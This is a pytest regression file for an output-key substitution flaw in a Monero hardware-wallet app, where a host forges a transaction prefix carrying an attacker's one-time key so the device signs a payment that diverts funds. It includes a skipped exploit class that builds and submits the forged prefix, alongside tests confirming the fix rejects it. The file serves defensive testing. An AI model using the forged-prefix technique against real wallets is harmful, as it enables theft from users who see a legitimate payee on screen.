"""
Output-key substitution PoC.

The device derives the real one-time output key in INS_GEN_TXOUT_KEYS and returns
it to the host, but (before the fix) never checked that the key placed into the
signed prefix matched. INS_PREFIX_HASH just hashes whatever the host streams, and
INS_VALIDATE only re-checks the reviewed (Aout, Bout, is_change, AKout) -- not the
one-time key that decides who can spend the output.

So a host can derive keys for a benign destination (shown to the user), then stream
a prefix whose vout carries an attacker-chosen one-time key, and have the device
sign it: the user sees "pay X to A_legit" while the output pays the attacker.

The fix chains every derived key into sha256_out_eph -> OUT_EPH on the build side;
on the verify side INS_PREFIX_HASH re-walks vin/vout and compares the vout keys to
OUT_EPH (mismatch, or vout_count != tx_output_cnt -> SW_SECURITY_OUTKEYS_CHAIN_CONTROL).

Classes:
  TestOutKeySubstitutionVuln  - device accepts the swapped key (vulnerable build only)
  TestOutKeySubstitutionFixed - device rejects it with 0x6915 (after the fix)
  TestLegitimateOutKeys       - a prefix with the device-derived key is still accepted
"""

import pytest
import nacl.bindings as nb
from ragger.error import ExceptionRAPDU

from monero_client.monero_cmd import MoneroCmd
from monero_client.monero_types import Keys, SigType
from monero_client.utils.tx_prefix import build_tx_prefix_outkeys

# Status word raised by the binding fix.
SW_SECURITY_OUTKEYS_CHAIN_CONTROL = 0x6915


# ---------------------------------------------------------------------------
# Identities
# ---------------------------------------------------------------------------
def _sc_reduce32(b: bytes) -> bytes:
    _L = 2 ** 252 + 27742317777372353535851937790883648493
    return (int.from_bytes(b, "little") % _L).to_bytes(32, "little")


# User (from the test seed "abandon … about") — the destination shown on screen.
_USER = Keys(
    public_view_key=bytes.fromhex(
        "865cbfab852a1d1ccdfc7328e4dac90f78fc2154257d07522e9b79e637326dfa"
    ),
    public_spend_key=bytes.fromhex(
        "dae41d6b13568fdd71ec3d20c2f614c65fe819f36ca5da8d24df3bd89b2bad9d"
    ),
    secret_view_key=bytes.fromhex(
        "0f3fe25d0c6d4c94dde0c0bcc214b233e9c72927f813728b0f01f28f9d5e1201"
    ),
    secret_spend_key=bytes.fromhex(
        "3b094ca7218f175e91fa2402b4ae239a2fe8262792a3e718533a1a357a1e4109"
    ),
    addr="",
)

# Attacker-controlled one-time output key (a valid Ed25519 point, ≠ P_device).
_ATTACKER_OUT_KEY = nb.crypto_scalarmult_ed25519_base_noclamp(
    _sc_reduce32(bytes([0x11] * 32))
)


def _gen_single_output(monero: MoneroCmd, state) -> bytes:
    """reset → set REAL → open_tx → gen_txout_keys(out 0, A_legit/B_legit).

    Returns the device-derived one-time output key P_device."""
    monero.reset_and_get_version(monero_client_version=b"0.18")
    assert monero.set_signature_mode(sig_type=SigType.REAL) == SigType.REAL
    tx_pub_key, _tx_priv_key, _, _ = monero.open_tx()
    state["tx_pub_key"] = tx_pub_key
    state["_tx_priv_key"] = _tx_priv_key

    _ak, p_device, _ = monero.gen_txout_keys(
        _tx_priv_key=_tx_priv_key,
        tx_pub_key=tx_pub_key,
        dst_pub_view_key=_USER.public_view_key,
        dst_pub_spend_key=_USER.public_spend_key,
        output_index=0,
        is_change_addr=False,
        is_subaddress=False,
    )
    state["p_device"] = p_device
    return p_device


# ---------------------------------------------------------------------------
# TestOutKeySubstitutionVuln  (passes on the VULNERABLE build)
# ---------------------------------------------------------------------------
@pytest.mark.incremental
@pytest.mark.skip(reason="Demonstrates the (now-fixed) bug; passes only on a vulnerable build")
class TestOutKeySubstitutionVuln:
    """
    End-to-end demonstration that the device signs an output key it never
    derived. The host swaps the device-derived P for an attacker key inside the
    prefix; INS_PREFIX_HASH returns SW_OK and a prefix hash computed over the
    forged bytes — i.e. the attacker's output would be signed.

    BEFORE the binding fix → SW_OK (vulnerability present, this class passes).
    AFTER the fix          → 0x6915 at prefix_hash_update.

    It is @skip-ed because the binding fix is in place; remove the skip to
    re-confirm the exploit against a deliberately vulnerable build.
    """

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {"tx_pub_key": None, "_tx_priv_key": None, "p_device": None}

    @staticmethod
    def test_gen_txout_keys(monero: MoneroCmd, state):
        p_device = _gen_single_output(monero, state)
        # Sanity: the attacker key really differs from what the device derived.
        assert p_device != _ATTACKER_OUT_KEY

    @staticmethod
    def test_prefix_hash_accepts_swapped_key(
        monero: MoneroCmd, device, test_name: str, state
    ):
        monero.prefix_hash_init(
            test_name, device, navigator=None, version=0, timelock=0
        )

        # Forge the prefix: vout carries the ATTACKER key, not state["p_device"]
        # (extra still carries the genuine R, so the only anomaly is the vout key).
        forged = build_tx_prefix_outkeys(
            vout_keys=[_ATTACKER_OUT_KEY], tx_pubkey=state["tx_pub_key"]
        )
        prefix_hash = monero.prefix_hash_update(index=1, payload=forged, is_last=True)

        # Vulnerable device hashed the forged output key without complaint.
        assert len(prefix_hash) == 32
        print(
            "\n[Vuln confirmed] device hashed an attacker-controlled output key:\n"
            f"  device-derived P_device : {state['p_device'].hex()}\n"
            f"  signed   vout[0].key     : {_ATTACKER_OUT_KEY.hex()}\n"
            f"  prefixH (to be signed)   : {prefix_hash.hex()}"
        )


# ---------------------------------------------------------------------------
# TestOutKeySubstitutionFixed  (passes only AFTER the binding fix)
# ---------------------------------------------------------------------------
@pytest.mark.incremental
class TestOutKeySubstitutionFixed:
    """
    After the fix, prefix_hash_update re-walks vin/vout and compares the signed
    one-time keys against the build-side digest OUT_EPH. The swapped key yields a
    mismatch → SW_SECURITY_OUTKEYS_CHAIN_CONTROL (0x6915), before any signature
    is produced.
    """

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {"tx_pub_key": None, "_tx_priv_key": None, "p_device": None}

    @staticmethod
    def test_gen_txout_keys(monero: MoneroCmd, state):
        p_device = _gen_single_output(monero, state)
        assert p_device != _ATTACKER_OUT_KEY

    @staticmethod
    def test_prefix_hash_rejects_swapped_key(
        monero: MoneroCmd, device, test_name: str, state
    ):
        monero.prefix_hash_init(
            test_name, device, navigator=None, version=0, timelock=0
        )

        forged = build_tx_prefix_outkeys(
            vout_keys=[_ATTACKER_OUT_KEY], tx_pubkey=state["tx_pub_key"]
        )
        with pytest.raises(ExceptionRAPDU) as exc_info:
            monero.prefix_hash_update(index=1, payload=forged, is_last=True)
        assert exc_info.value.status == SW_SECURITY_OUTKEYS_CHAIN_CONTROL, (
            f"Expected SW_SECURITY_OUTKEYS_CHAIN_CONTROL "
            f"({hex(SW_SECURITY_OUTKEYS_CHAIN_CONTROL)}), "
            f"got {hex(exc_info.value.status)}"
        )


# ---------------------------------------------------------------------------
# TestLegitimateOutKeys  (the fix must not break honest transactions)
# ---------------------------------------------------------------------------
@pytest.mark.incremental
class TestLegitimateOutKeys:
    """
    Sanity check: a prefix whose vout carries the *device-derived* one-time key
    (exactly what an honest host streams) is accepted and yields a prefix hash.
    """

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {"tx_pub_key": None, "_tx_priv_key": None, "p_device": None}

    @staticmethod
    def test_gen_txout_keys(monero: MoneroCmd, state):
        _gen_single_output(monero, state)

    @staticmethod
    def test_prefix_hash_accepts_device_key(
        monero: MoneroCmd, device, test_name: str, state
    ):
        monero.prefix_hash_init(
            test_name, device, navigator=None, version=0, timelock=0
        )

        honest = build_tx_prefix_outkeys(
            vout_keys=[state["p_device"]], tx_pubkey=state["tx_pub_key"]
        )
        prefix_hash = monero.prefix_hash_update(index=1, payload=honest, is_last=True)
        assert len(prefix_hash) == 32
